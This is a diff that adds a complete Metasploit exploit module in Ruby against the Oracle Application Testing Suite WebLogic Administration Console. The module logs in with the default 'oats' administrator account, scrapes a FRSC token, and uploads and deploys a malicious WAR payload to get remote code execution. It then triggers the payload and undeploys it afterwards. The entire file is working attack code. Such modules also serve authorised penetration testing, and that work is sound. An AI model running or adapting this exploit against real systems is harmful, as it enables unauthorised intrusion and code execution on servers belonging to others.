@@ -1,0 +1,398 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Oracle Application Testing Suite WebLogic Server Administration Console War Deployment',
+      'Description'    => %q{
+        This module abuses a feature in WebLogic Server's Administration Console to install
+        a malicious Java application in order to gain remote code execution. Authentication
+        is required, however by default, Oracle ships with a "oats" account that you could
+        log in with, which grants you administrator access.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Steven Seeley', # Used the trick and told me about it
+          'sinn3r'         # Metasploit module
+        ],
+      'Platform'       => 'java',
+      'Arch'           => ARCH_JAVA,
+      'Targets'        =>
+        [
+          [ 'WebLogic Server Administration Console 12 or prior', { } ]
+        ],
+      'References'     =>
+        [
+          # The CVE description matches what this exploit is doing, but it was for version
+          # 9.0 and 9.1. We are not super sure whether this is the right CVE or not.
+          # ['CVE', '2007-2699']
+        ],
+      'DefaultOptions' =>
+        {
+          'RPORT' => 8088
+        },
+      'Notes'          =>
+        {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => 'Mar 13 2019',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The route for the Rails application', '/']),
+        OptString.new('OATSUSERNAME', [true, 'The username for the admin console', 'oats']),
+        OptString.new('OATSPASSWORD', [true, 'The password for the admin console'])
+      ])
+
+    register_advanced_options(
+      [
+        OptString.new('DefaultOatsPath', [true, 'The default path for OracleATS', 'C:\\OracleATS'])
+      ])
+  end
+
+  class LoginSpec
+    attr_accessor :admin_console_session
+  end
+
+  def login_spec
+    @login_spec ||= LoginSpec.new
+  end
+
+  class OatsWarPayload < MetasploitModule
+    attr_reader :name
+    attr_reader :war
+
+    def initialize(payload)
+      @name = [Faker::App.name, Rex::Text.rand_name].sample
+      @war = payload.encoded_war(app_name: name).to_s
+    end
+  end
+
+  def default_oats_path
+    datastore['DefaultOatsPath']
+  end
+
+  def war_payload
+    @war_payload ||= OatsWarPayload.new(payload)
+  end
+
+  def set_frsc
+    value = get_deploy_frsc
+    @frsc = value
+  end
+
+  def check
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'console', 'login', 'LoginForm.jsp')
+    })
+
+    if res && res.body.include?('Oracle WebLogic Server Administration Console')
+      return Exploit::CheckCode::Detected
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def set_admin_console_session(res)
+    cookie = res.get_cookies
+    admin_console_session = cookie.scan(/ADMINCONSOLESESSION=(.+);/).flatten.first
+    vprint_status("Token for console session is: #{admin_console_session}")
+    login_spec.admin_console_session = admin_console_session
+  end
+
+  def is_logged_in?(res)
+    html = res.get_html_document
+    a_element = html.at('a')
+    if a_element.respond_to?(:attributes) && a_element.attributes['href']
+      link = a_element.attributes['href'].value
+      return URI(link).request_uri == '/console'
+    end
+
+    false
+  end
+
+  def do_login
+    uri = normalize_uri(target_uri.path, 'console', 'login', 'LoginForm.jsp')
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => uri
+    })
+
+    fail_with(Failure::Unknown, 'No response from server') unless res
+    set_admin_console_session(res)
+
+    uri = normalize_uri(target_uri.path, 'console', 'j_security_check')
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => uri,
+      'cookie' => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+      'vars_post' =>
+        {
+          'j_username'           => datastore['OATSUSERNAME'],
+          'j_password'           => datastore['OATSPASSWORD'],
+          'j_character_encoding' => 'UTF-8'
+        }
+    })
+
+    fail_with(Failure::Unknown, 'No response while trying to log in') unless res
+    fail_with(Failure::NoAccess, 'Failed to login') unless is_logged_in?(res)
+    store_valid_credential(user: datastore['OATSUSERNAME'], private: datastore['OATSPASSWORD'])
+    set_admin_console_session(res)
+  end
+
+  def get_deploy_frsc
+    # First we are just going through the pages in a specific order to get the FRSC value
+    # we need to prepare uploading the WAR file.
+    res = nil
+    requests =
+      [
+        { path: 'console/', vars: {} },
+        { path: 'console/console.portal', vars: {'_nfpb'=>"true"} },
+        { path: 'console/console.portal', vars: {'_nfpb'=>"true", '_pageLabel' => 'HomePage1'} }
+      ]
+
+    requests.each do |req|
+      res = send_request_cgi({
+        'method'   => 'GET',
+        'uri'      => normalize_uri(target_uri.path, req[:path]),
+        'cookie'   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+        'vars_get' => req[:vars]
+      })
+
+      fail_with(Failure::Unknown, 'No response while retrieving FRSC') unless res
+    end
+
+    html = res.get_html_document
+    hidden_input = html.at('input[@name="ChangeManagerPortletfrsc"]')
+    frsc_attr = hidden_input.respond_to?(:attributes) ? hidden_input.attributes['value'] : nil
+    frsc_attr ? frsc_attr.value : ''
+  end
+
+  def do_select_upload_action
+    action = '/com/bea/console/actions/app/install/selectUploadApp'
+    app_path = Rex::FileUtils.normalize_win_path(default_oats_path, 'oats\\servers\\AdminServer\\upload')
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'console', 'console.portal'),
+      'cookie'    => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+      'vars_get'  =>
+        {
+          'AppApplicationInstallPortlet_actionOverride' => action
+        },
+      'vars_post' =>
+        {
+          'AppApplicationInstallPortletselectedAppPath' => app_path,
+          'AppApplicationInstallPortletfrsc' => frsc
+        }
+    })
+
+    fail_with(Failure::Unknown, "No response from #{action}") unless res
+  end
+
+  def do_upload_app_action
+    action = '/com/bea/console/actions/app/install/uploadApp'
+    ctype = 'application/octet-stream'
+    app_cname = 'AppApplicationInstallPortletuploadAppPath'
+    plan_cname = 'AppApplicationInstallPortletuploadPlanPath'
+    frsc_cname = 'AppApplicationInstallPortletfrsc'
+    war = war_payload.war
+    war_name = war_payload.name
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(war, ctype, 'binary', "form-data; name=\"#{app_cname}\"; filename=\"#{war_name}.war\"")
+    post_data.add_part('', ctype, nil, "form-data; name=\"#{plan_cname}\"; filename=\"\"")
+    post_data.add_part(frsc, nil, nil, "form-data; name=\"#{frsc_cname}\"")
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),
+      'cookie'   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+      'vars_get' =>
+        {
+          'AppApplicationInstallPortlet_actionOverride' => action
+        },
+       'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
+       'data'    => post_data.to_s
+    })
+
+    fail_with(Failure::Unknown, "No response from #{action}") unless res
+    print_response_message(res)
+  end
+
+  def do_app_select_action
+    action = '/com/bea/console/actions/app/install/appSelected'
+    war_name = war_payload.name
+    app_path = Rex::FileUtils.normalize_win_path(default_oats_path, "oats\\servers\\AdminServer\\upload\\#{war_name}.war")
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),
+      'cookie'   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+      'vars_get' =>
+        {
+          'AppApplicationInstallPortlet_actionOverride' => action
+        },
+      'vars_post' =>
+        {
+          'AppApplicationInstallPortletselectedAppPath' => app_path,
+          'AppApplicationInstallPortletfrsc'            => frsc
+        }
+    })
+
+    fail_with(Failure::Unknown, "No response from #{action}") unless res
+    print_response_message(res)
+  end
+
+  def do_style_select_action
+    action = '/com/bea/console/actions/app/install/targetStyleSelected'
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),
+      'cookie'   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+      'vars_get' =>
+        {
+          'AppApplicationInstallPortlet_actionOverride' => action
+        },
+      'vars_post' =>
+        {
+          'AppApplicationInstallPortlettargetStyle' => 'Application',
+          'AppApplicationInstallPortletfrsc'        => frsc
+        }
+    })
+
+    fail_with(Failure::Unknown, "No response from #{action}") unless res
+  end
+
+  def do_finish_action
+    action = '/com/bea/console/actions/app/install/finish'
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),
+      'cookie'   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+      'vars_get' =>
+        {
+          'AppApplicationInstallPortlet_actionOverride' => action
+        },
+      'vars_post' =>
+        {
+          'AppApplicationInstallPortletname'             => war_payload.name,
+          'AppApplicationInstallPortletsecurityModel'    => 'DDOnly',
+          'AppApplicationInstallPortletstagingStyle'     => 'Default',
+          'AppApplicationInstallPortletplanStagingStyle' => 'Default',
+          'AppApplicationInstallPortletfrsc'             => frsc
+        }
+    })
+
+    fail_with(Failure::Unknown, "No response from #{action}") unless res
+    print_response_message(res)
+
+    # 302 is a good enough indicator of a successful upload, otherwise
+    # the server would actually return a 200 with an error message.
+    res.code == 302
+  end
+
+  def print_response_message(res)
+    html = res.get_html_document
+    message_div = html.at('div[@class="message"]')
+    if message_div
+      msg = message_div.at('span').text
+      print_status("Server replies: #{msg.inspect}")
+    end
+  end
+
+  def deploy_war
+    set_frsc
+    print_status("FRSC value: #{frsc}")
+    do_select_upload_action
+    do_upload_app_action
+    do_app_select_action
+    do_style_select_action
+    do_finish_action
+  end
+
+  def goto_war(name)
+    print_good("Operation \"#{name}\" is a go!")
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, name)
+    })
+
+    print_status("Code #{res.code} on \"#{name}\" request") if res
+  end
+
+  def undeploy_war
+    war_name = war_payload.name
+    handle = 'com.bea.console.handles.JMXHandle("com.bea:Name=oats,Type=Domain")'
+    contents = %Q|com.bea.console.handles.AppDeploymentHandle("com.bea:Name=#{war_name},Type=AppDeployment")|
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),
+      'cookie'   => "ADMINCONSOLESESSION=#{login_spec.admin_console_session}",
+      'vars_get' =>
+        {
+          'AppApplicationUninstallPortletreturnTo' => 'AppDeploymentsControlPage',
+          'AppDeploymentsControlPortlethandle' => handle
+        },
+      'vars_post' =>
+        {
+          # For some reason, the value given to the server is escapped twice.
+          # The Metasploit API should do it at least once.
+          'AppApplicationUninstallPortletchosenContents' => CGI.escape(contents),
+          '_pageLabel' => 'AppApplicationUninstallPage',
+          '_nfpb'      => 'true',
+          'AppApplicationUninstallPortletfrsc' => frsc
+        }
+    })
+
+    if res && res.code == 302
+      print_good("Successfully undeployed #{war_name}.war")
+    else
+      print_warning("Unable to successfully undeploy #{war_name}.war")
+      print_warning('You may want to do so manually.')
+    end
+  end
+
+  def cleanup
+    undeploy_war if is_cleanup_ready
+    super
+  end
+
+  def setup
+    @is_cleanup_ready = false
+    super
+  end
+
+  def exploit
+    unless check == Exploit::CheckCode::Detected
+      print_status('Target does not have the login page we are looking for.')
+      return
+    end
+
+    do_login
+    print_good("Logged in as #{datastore['OATSUSERNAME']}:#{datastore['OATSPASSWORD']}")
+    print_status("Ready for war. Codename \"#{war_payload.name}\" at #{war_payload.war.length} bytes")
+    result = deploy_war
+    if result
+      @is_cleanup_ready = true
+      goto_war(war_payload.name)
+    end
+  end
+
+  attr_reader :frsc
+  attr_reader :is_cleanup_ready
+end
